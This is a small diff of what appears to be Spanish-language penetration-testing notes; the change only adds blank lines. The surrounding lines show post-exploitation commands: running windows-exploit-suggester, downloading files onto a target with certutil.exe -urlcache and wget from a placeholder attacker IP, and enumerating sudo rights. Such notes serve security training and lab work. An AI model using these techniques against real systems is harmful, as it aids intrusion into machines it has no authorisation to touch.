@@ -23,9 +23,11 @@ python2 windows-exploit-suggester -d (archivo descargado) -i systeminfo.txt
 //en linux abrir un servidor
 certutil.exe -f -urlcache -split http://<ip que esta enviando el archivo>:<puerto>/archivo.extension archivo.extension
 
+
 ######## transferir archivos de linux a linux ##########
 //abrir servidor
 wget http://<ip que esta enviando el archivo>:<puerto>/archivo.etension -O archivo.extension
+
 
 ######## saber permisos en linux ########
 permisos sudo: sudo -l
